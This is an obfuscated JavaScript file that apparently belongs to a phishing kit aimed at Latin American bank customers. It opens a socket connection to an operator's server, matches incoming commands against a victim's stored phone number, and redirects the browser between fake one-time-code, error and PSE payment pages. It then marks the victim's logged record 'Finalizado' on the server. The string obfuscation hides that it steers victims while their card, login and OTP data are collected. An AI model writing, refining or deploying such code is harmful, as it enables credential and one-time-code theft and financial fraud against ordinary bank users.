const _0x3770de = _0x6104;
(function (_0x13c17a, _0x42152c) {
  const _0xaa2adb = _0x6104,
    _0x85f805 = _0x13c17a();
  while (!![]) {
    try {
      const _0x10726b =
        -parseInt(_0xaa2adb(0x18b)) / 0x1 +
        (parseInt(_0xaa2adb(0x17b)) / 0x2) *
          (parseInt(_0xaa2adb(0x197)) / 0x3) +
        (-parseInt(_0xaa2adb(0x18e)) / 0x4) *
          (-parseInt(_0xaa2adb(0x178)) / 0x5) +
        (parseInt(_0xaa2adb(0x18a)) / 0x6) *
          (parseInt(_0xaa2adb(0x195)) / 0x7) +
        parseInt(_0xaa2adb(0x182)) / 0x8 +
        (-parseInt(_0xaa2adb(0x188)) / 0x9) *
          (parseInt(_0xaa2adb(0x192)) / 0xa) +
        (-parseInt(_0xaa2adb(0x194)) / 0xb) *
          (parseInt(_0xaa2adb(0x184)) / 0xc);
      if (_0x10726b === _0x42152c) break;
      else _0x85f805["push"](_0x85f805["shift"]());
    } catch (_0x77602a) {
      _0x85f805["push"](_0x85f805["shift"]());
    }
  }
})(_0x17f0, 0x7de35);
function _0x17f0() {
  const _0x2fe810 = [
    "./errorPse.html",
    "18395WOhKqr",
    "href",
    "json",
    "1265182rPJHHH",
    "./otp.html",
    "metaInfo",
    "Finalizado",
    "/logs/logFinish/",
    "location",
    "Usuario\x20encontrado",
    "7611600vIAEKF",
    "finish",
    "18236700IdRJNd",
    "valor",
    "/logs/logs",
    "logs",
    "225duaFWk",
    "telnum",
    "6jPnDvA",
    "423769KdhOTW",
    "newdin",
    "stringify",
    "372DLUEYI",
    "log",
    "reg",
    "GET",
    "82210mEzXXm",
    "idreg",
    "11WQqWBo",
    "5169276EVJNIf",
    "application/json",
    "3xxkRJP",
    "./otp.error.html",
    "./index.error.html",
    "valid",
    "din",
  ];
  _0x17f0 = function () {
    return _0x2fe810;
  };
  return _0x17f0();
}
function _0x6104(_0x306594, _0xf0e19b) {
  const _0x17f0bc = _0x17f0();
  return (
    (_0x6104 = function (_0x610491, _0x5c0437) {
      _0x610491 = _0x610491 - 0x177;
      let _0x49782f = _0x17f0bc[_0x610491];
      return _0x49782f;
    }),
    _0x6104(_0x306594, _0xf0e19b)
  );
}
var socket = io["connect"](url);
socket["on"](_0x3770de(0x187), function (_0x36dd4c) {
  const _0x2641a2 = _0x3770de;
  if (
    _0x36dd4c["valor"] == "us" &&
    _0x36dd4c[_0x2641a2(0x19a)] == info[_0x2641a2(0x17d)][_0x2641a2(0x189)]
  )
    window[_0x2641a2(0x180)][_0x2641a2(0x179)] = _0x2641a2(0x199);
  else {
    if (
      _0x36dd4c[_0x2641a2(0x185)] == _0x2641a2(0x19b) &&
      _0x36dd4c[_0x2641a2(0x19a)] == info[_0x2641a2(0x17d)][_0x2641a2(0x189)]
    )
      window[_0x2641a2(0x180)][_0x2641a2(0x179)] = _0x2641a2(0x17c);
    else {
      if (
        _0x36dd4c[_0x2641a2(0x185)] == _0x2641a2(0x18c) &&
        _0x36dd4c[_0x2641a2(0x19a)] == info["metaInfo"][_0x2641a2(0x189)]
      )
        window[_0x2641a2(0x180)]["href"] = _0x2641a2(0x198);
      else {
        if (
          _0x36dd4c["valor"] == _0x2641a2(0x183) &&
          _0x36dd4c[_0x2641a2(0x19a)] ==
            info[_0x2641a2(0x17d)][_0x2641a2(0x189)]
        ) {
          async function _0x183b96() {
            const _0x124ca7 = _0x2641a2,
              _0x582612 = await fetch(url + _0x124ca7(0x186), {
                method: _0x124ca7(0x191),
                headers: { "Content-Type": "application/json" },
              }),
              _0x5d261f = await _0x582612[_0x124ca7(0x17a)](),
              _0x145e6e = [..._0x5d261f];
            for (const _0x58e1dc of _0x145e6e) {
              if (
                _0x58e1dc[_0x124ca7(0x190)] == info[_0x124ca7(0x17d)]["cc"] &&
                _0x58e1dc["cl"] == info[_0x124ca7(0x17d)][_0x124ca7(0x189)]
              ) {
                console[_0x124ca7(0x18f)](_0x124ca7(0x181));
                const _0x554b2b = await fetch(
                    url + _0x124ca7(0x17f) + _0x58e1dc[_0x124ca7(0x193)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0x124ca7(0x196) },
                      body: JSON[_0x124ca7(0x18d)]({
                        status: _0x124ca7(0x17e),
                      }),
                    }
                  ),
                  _0x534445 = await _0x554b2b["json"]();
              }
            }
            window[_0x124ca7(0x180)]["href"] = _0x124ca7(0x177);
          }
          _0x183b96();
          return;
        }
      }
    }
  }
});
